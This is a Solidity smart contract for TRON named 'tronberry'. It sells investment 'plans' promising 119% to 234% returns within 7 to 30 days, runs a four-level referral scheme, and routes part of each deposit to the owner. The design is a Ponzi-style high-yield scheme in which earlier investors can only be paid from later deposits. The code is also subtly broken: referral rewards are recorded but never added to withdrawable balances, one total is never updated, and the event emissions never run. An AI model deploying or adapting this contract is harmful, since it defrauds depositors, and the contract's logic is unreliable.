//SourceUnit: contract.sol

pragma solidity ^0.4.25;

contract tronberry {
    struct Plan {
        uint minimum;
        uint totallprofit;
        uint lifesecs;
    }

    struct Player {
        uint balance_withdrawable;
        uint last_payout;
        uint withdraw;
        uint totallinvested;
        uint[] builds;
        uint[] builds_time;
        uint[] buildsinvest;
        
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        
        uint time;
        address affFrom;
        uint256 affRewards;
        
    }

    address public owner;
    uint releasetime = 1000;
    using SafeMath for uint256;
    uint interestRateDivisor= 1000000000;
    Plan[] public builds;
    mapping(address => Player) public players;
    uint public totallinvested;
    uint public totallrefrewards;
    
    event Deposit(address indexed addr, uint value, uint amount);
    event BuyBuild(address indexed addr, uint build);
    event Withdraw(address indexed addr, uint value, uint amount);

    constructor() public {
        owner = msg.sender;

        builds.push(Plan({minimum:50 ,totallprofit: 119,lifesecs:86400* 7}));
        builds.push(Plan({minimum:50 ,totallprofit: 124,lifesecs:86400* 8}));
        builds.push(Plan({minimum:50 ,totallprofit: 129,lifesecs:86400* 9}));
        builds.push(Plan({minimum:50 ,totallprofit: 134,lifesecs:86400* 10}));
        builds.push(Plan({minimum:50 ,totallprofit: 139,lifesecs:86400* 11}));
        builds.push(Plan({minimum:50 ,totallprofit: 144,lifesecs:86400* 12}));
        builds.push(Plan({minimum:50 ,totallprofit: 149,lifesecs:86400* 13}));
        builds.push(Plan({minimum:50 ,totallprofit: 154,lifesecs:86400* 14}));
        builds.push(Plan({minimum:50 ,totallprofit: 159,lifesecs:86400* 15}));
        builds.push(Plan({minimum:50 ,totallprofit: 164,lifesecs:86400* 16}));
        builds.push(Plan({minimum:50 ,totallprofit: 169,lifesecs:86400* 17}));
        builds.push(Plan({minimum:50 ,totallprofit: 174,lifesecs:86400* 18}));
        builds.push(Plan({minimum:50 ,totallprofit: 179,lifesecs:86400* 19}));
        builds.push(Plan({minimum:50 ,totallprofit: 184,lifesecs:86400* 20}));
        builds.push(Plan({minimum:50 ,totallprofit: 189,lifesecs:86400* 21}));
        builds.push(Plan({minimum:50 ,totallprofit: 194,lifesecs:86400* 22}));
        builds.push(Plan({minimum:50 ,totallprofit: 199,lifesecs:86400* 23}));
        builds.push(Plan({minimum:50 ,totallprofit: 204,lifesecs:86400* 24}));
        builds.push(Plan({minimum:50 ,totallprofit: 209,lifesecs:86400* 25}));
        builds.push(Plan({minimum:50 ,totallprofit: 214,lifesecs:86400* 26}));
        builds.push(Plan({minimum:50 ,totallprofit: 219,lifesecs:86400* 27}));
        builds.push(Plan({minimum:50 ,totallprofit: 224,lifesecs:86400* 28}));
        builds.push(Plan({minimum:50 ,totallprofit: 229,lifesecs:86400* 29}));
        builds.push(Plan({minimum:50 ,totallprofit: 234,lifesecs:86400* 30}));
    }

    function _payout(address addr) private {
        uint payout = payoutOf(addr);
        if(payout > 0) {
            players[addr].balance_withdrawable += payout;
            players[addr].last_payout = block.timestamp;
        }
    }
    
    function register(address _addr, address _affAddr) private returns(Player){

      Player storage player = players[_addr];
        
      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      
      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);

      
    }

    
    function buyplan(uint planid,address refer) payable public returns(uint[]) {
        require(now>releasetime,"Not started yet");
        require(planid<builds.length, "plan not found");
        require(msg.value>=builds[planid].minimum, "minimum is higher");
        
        Player storage player = players[msg.sender];
        
        
        if(player.time==0)
        {

            player.time = now;
            if(refer != address(0) && players[refer].totallinvested > 0){
              register(msg.sender, refer);
            }
            else{
              register(msg.sender, owner);
            }
        }
        
        
        
        totallinvested+=msg.value;
        owner.transfer(msg.value/10);
        
        distributeRef(msg.value,player.affFrom);
        
        player.builds.push(planid);
        player.buildsinvest.push(msg.value);
        player.builds_time.push(block.timestamp);
        player.totallinvested += msg.value;

        return player.builds;
        emit BuyBuild(msg.sender, planid);
    }

    function buyplannormal(uint planid) payable public returns(uint[]) {
        require(now>releasetime,"Not started yet");
        require(planid<builds.length, "plan not found");
        require(msg.value>=builds[planid].minimum, "minimum is higher");
        
        Player storage player = players[msg.sender];
        
        address refer = address(0);
        
        if(player.time==0)
        {

            player.time = now;
            if(refer != address(0) && players[refer].totallinvested > 0){
              register(msg.sender, refer);
            }
            else{
              register(msg.sender, address(0));
            }
        }
        
        
        
        totallinvested+=msg.value;
        owner.transfer(msg.value/10);
        
        
        player.builds.push(planid);
        player.buildsinvest.push(msg.value);
        player.builds_time.push(block.timestamp);
        player.totallinvested += msg.value;

        return player.builds;
        emit BuyBuild(msg.sender, planid);
    }

    function() payable external {
        revert();
    }

    function investedplans(address addr) public view returns(uint[])
    {
        Player storage player = players[addr];
         uint[] memory data  = new uint[]((player.builds.length*3)+1);
         uint cindex;
        data[0]=now;
        cindex++;
        for(uint i = 0; i < player.builds.length; i++) {
            
            data[cindex] = (player.builds[i]);
            cindex++;
            data[cindex] = (player.builds_time[i]);
            cindex++;
            data[cindex] = (player.buildsinvest[i]);
            cindex++;
            
        }
        return data;
    }

    function withdraw() external {

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.balance_withdrawable > 0, "Insufficient funds");
        
        uint value = player.balance_withdrawable;
        
        player.balance_withdrawable = 0;
        player.withdraw += value;
        
        msg.sender.transfer(value/1000000000);
        emit Withdraw(msg.sender, value, value);
        
        
    }


    function payoutOf(address addr) view public returns(uint value) {
        Player storage player = players[addr];
        
        for(uint i = 0; i < player.builds.length; i++) {
            
            uint time_end = player.builds_time[i] + builds[player.builds[i]].lifesecs;
            uint from = player.last_payout > player.builds_time[i] ? player.last_payout : player.builds_time[i];
            uint to = block.timestamp > time_end ? time_end : block.timestamp;
            
            if(from < to) {
                uint totallprofit = player.buildsinvest[i].div(100).mul(builds[player.builds[i]].totallprofit).mul(1000000000);
                
                uint secPassed = (to - from);
        
                value +=  secPassed*(totallprofit/builds[player.builds[i]].lifesecs);
            }
        }
        
        return value;
    }
    
    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(11)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;

        
        
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(4)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].balance_withdrawable.add(_affRewards);
            totallrefrewards += _affRewards;
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].balance_withdrawable.add(_affRewards);
            totallrefrewards += _affRewards;
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            players[_affAddr3].balance_withdrawable.add(_affRewards);
             totallrefrewards += _affRewards;
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].balance_withdrawable.add(_affRewards);
            totallrefrewards.add(_affRewards);
        }
        
        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }
    
    function Reffrom(address addr) public view returns(address)
    {
        return players[addr].affFrom;
    }
	
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}